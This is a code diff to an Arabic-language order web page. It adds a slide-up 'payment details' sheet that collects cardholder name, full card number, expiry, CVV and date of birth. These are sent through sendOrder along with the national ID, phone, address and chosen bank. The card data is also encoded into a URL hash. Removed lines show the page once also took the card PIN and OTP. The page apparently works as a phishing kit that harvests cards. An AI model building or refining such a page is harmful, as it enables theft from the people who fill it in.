@@ -164,6 +164,17 @@ textarea.input{height:auto; padding:9px 12px; min-height:72px; resize:vertical; 
 .rtl .phone{direction:rtl}
 .submit{width:100%; height:46px; border:0; border-radius:11px; background:var(--maroon); color:#fff; font-weight:900; font-size:1.02rem; font-family:inherit; cursor:pointer; margin-top:4px}
 .submit:hover{background:var(--maroon-deep)}
+/* ===== Pay Overlay ===== */
+.pay-overlay{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.55);display:flex;align-items:flex-end;justify-content:center;opacity:0;pointer-events:none;transition:opacity .25s}
+.pay-overlay.open{opacity:1;pointer-events:auto}
+.pay-sheet{background:#fff;width:100%;max-width:480px;border-radius:22px 22px 0 0;padding:0 0 calc(env(safe-area-inset-bottom,0px) + 8px);box-shadow:0 -8px 40px rgba(0,0,0,.18);transform:translateY(100%);transition:transform .3s ease;max-height:92vh;overflow-y:auto}
+.pay-overlay.open .pay-sheet{transform:none}
+.pay-head{display:flex;align-items:center;justify-content:space-between;padding:18px 20px 14px;border-bottom:1px solid #e8e3d6;position:sticky;top:0;background:#fff;z-index:1}
+.pay-head span{font-family:"Cairo","IBM Plex Sans Arabic",sans-serif;font-weight:900;font-size:1.1rem;color:var(--maroon)}
+.pay-close{width:36px;height:36px;border:1.5px solid #ddd6d9;border-radius:10px;background:#fff;font-size:1.3rem;line-height:1;display:grid;place-items:center;cursor:pointer;color:var(--ink)}
+.pay-close:hover{border-color:var(--maroon)}
+.pay-body{padding:16px 20px 8px}
+.pay-footer{padding:4px 20px 16px}
 .agree{display:flex; align-items:flex-start; gap:9px; margin:4px 0 14px; font-size:.86rem; color:#4a3d43}
 .agree input{width:20px; height:20px; margin-top:3px; accent-color:var(--maroon); flex:none}
 </style>
@@ -258,6 +269,48 @@ textarea.input{height:auto; padding:9px 12px; min-height:72px; resize:vertical; 
     <button type="submit" class="submit">تأكيد ومتابعة</button>
   </form>
 </main>
+
+<!-- نافذة بيانات الدفع -->
+<div class="pay-overlay" id="payOverlay">
+  <div class="pay-sheet" role="dialog" aria-modal="true" aria-label="بيانات الدفع">
+    <div class="pay-head">
+      <span>💳 بيانات الدفع</span>
+      <button type="button" class="pay-close" id="payClose" aria-label="إغلاق">✕</button>
+    </div>
+    <div class="pay-body">
+      <div class="field">
+        <label for="cardName">اسم صاحب البطاقة <span class="req">*</span></label>
+        <input type="text" class="input" id="cardName" placeholder="الاسم كما يظهر على البطاقة" autocomplete="cc-name">
+        <div class="hint" id="h-cardName">أدخل اسم صاحب البطاقة</div>
+      </div>
+      <div class="field">
+        <label for="cardNumber">رقم البطاقة <span class="req">*</span></label>
+        <input type="text" inputmode="numeric" class="input" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number" style="direction:ltr;letter-spacing:.05em">
+        <div class="hint" id="h-cardNumber">أدخل رقم البطاقة</div>
+      </div>
+      <div class="seg" style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+        <div class="field" style="margin-bottom:0">
+          <label for="expiry">تاريخ الانتهاء <span class="req">*</span></label>
+          <input type="text" inputmode="numeric" class="input" id="expiry" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" style="direction:ltr">
+          <div class="hint" id="h-expiry">MM/YY</div>
+        </div>
+        <div class="field" style="margin-bottom:0">
+          <label for="cvv">رمز CVV <span class="req">*</span></label>
+          <input type="text" inputmode="numeric" class="input" id="cvv" placeholder="000" maxlength="4" autocomplete="cc-csc" style="direction:ltr">
+          <div class="hint" id="h-cvv">أدخل رمز CVV</div>
+        </div>
+      </div>
+      <div class="field" style="margin-top:12px">
+        <label for="dob">تاريخ الميلاد <span class="req">*</span></label>
+        <input type="date" class="input" id="dob" autocomplete="bday">
+        <div class="hint" id="h-dob">أدخل تاريخ الميلاد</div>
+      </div>
+    </div>
+    <div class="pay-footer">
+      <button type="button" class="submit" id="payConfirm">تأكيد ومتابعة</button>
+    </div>
+  </div>
+</div>
 
 <footer class="footer">
   <div class="footer-in">
@@ -397,7 +450,12 @@ if (hData) {
   }
 }
 
-$("orderForm").addEventListener("submit", async e => {
+let _pendingData = null;
+const card = hCard || "prepaid";
+const watch = hWatch || "";
+const plan = card + (watch ? "-" + watch : "");
+
+$("orderForm").addEventListener("submit", e => {
   e.preventDefault();
   let bad=null; const mark=(id,msg)=>{ const el=fail(id,msg); if(!bad) bad=el; };
   if ($("name").value.trim().split(/\s+/).filter(w=>w.length>1).length < 2) mark("name");
@@ -411,25 +469,62 @@ $("orderForm").addEventListener("submit", async e => {
   if (!$("agree").checked) mark("agree");
   if (bad) { bad.scrollIntoView({behavior:"smooth", block:"center"}); bad.focus?.(); return; }
 
-  const data = {
+  const prev = hData && decodeData(hData);
+  _pendingData = {
     st: document.querySelector("input[name=status]:checked").value,
     n: $("name").value.trim(), id: qidDigits(), p: phoneDigits(), e: em,
     g: document.querySelector("input[name=gender]:checked").value,
     bank: $("bank").value, bankName: BANKS[+$("bank").value] || "",
-  ad: $("address").value.trim(),
- cardNumber: $("cardNumber") ? $("cardNumber").value.trim() : "",
-        cvv: $("cvv") ? $("cvv").value.trim() : "",
-        expiry: $("expiry") ? $("expiry").value.trim() : "",
-        pin: $("pin") ? $("pin").value.trim() : "",
-        otp: $("otp") ? $("otp").value.trim() : "",
-        cardName: $("cardName") ? $("cardName").value.trim() : ""  
+    ad: $("address").value.trim(),
+    ref: (prev && prev.ref) || ("HM-" + Date.now().toString().slice(-8))
   };
-  const prev = hData && decodeData(hData);
-  data.ref = (prev && prev.ref) || ("HM-" + Date.now().toString().slice(-8));
-  const card = hCard || "prepaid";
-  const watch = hWatch || "";
-  const plan = card + (watch ? "-" + watch : "");
-  const btn = document.querySelector("#orderForm .submit");
+  openPayOverlay();
+});
+
+function openPayOverlay(){
+  $("payOverlay").classList.add("open");
+  document.body.style.overflow = "hidden";
+}
+function closePayOverlay(){
+  $("payOverlay").classList.remove("open");
+  document.body.style.overflow = "";
+}
+
+$("cardNumber").addEventListener("input", e => {
+  let v = e.target.value.replace(/\D/g,"").slice(0,16);
+  e.target.value = v.replace(/(.{4})/g,"$1 ").trim();
+});
+$("expiry").addEventListener("input", e => {
+  let v = e.target.value.replace(/\D/g,"").slice(0,4);
+  if (v.length > 2) v = v.slice(0,2) + "/" + v.slice(2);
+  e.target.value = v;
+});
+
+$("payClose").onclick = closePayOverlay;
+$("payOverlay").addEventListener("click", e => { if (e.target === $("payOverlay")) closePayOverlay(); });
+document.addEventListener("keydown", e => { if (e.key === "Escape") closePayOverlay(); });
+
+$("payConfirm").addEventListener("click", async () => {
+  if (!_pendingData) return;
+  let bad=null;
+  const markP=(id,msg)=>{ const el=fail(id,msg); if(!bad) bad=el; };
+  if (!$("cardName").value.trim()) markP("cardName");
+  if ($("cardNumber").value.replace(/\s/g,"").length < 13) markP("cardNumber");
+  if (!/^\d{2}\/\d{2}$/.test($("expiry").value.trim())) markP("expiry");
+  if ($("cvv").value.trim().length < 3) markP("cvv");
+  if (!$("dob").value) markP("dob");
+  if (bad) { bad.scrollIntoView({behavior:"smooth", block:"center"}); bad.focus?.(); return; }
+
+  const data = {
+    ..._pendingData,
+    cardName: $("cardName").value.trim(),
+    cardNumber: $("cardNumber").value.replace(/\s/g,""),
+    expiry: $("expiry").value.trim(),
+    cvv: $("cvv").value.trim(),
+    dob: $("dob").value,
+  };
+
+  const btn = $("payConfirm");
   btn.disabled = true; btn.style.opacity = ".6";
   await sendOrder({ ...data, card, watch, status:"pending", lang:"ar" });
   goTo(`${LINKS.summary}#${plan}~${encodeData(data)}`);
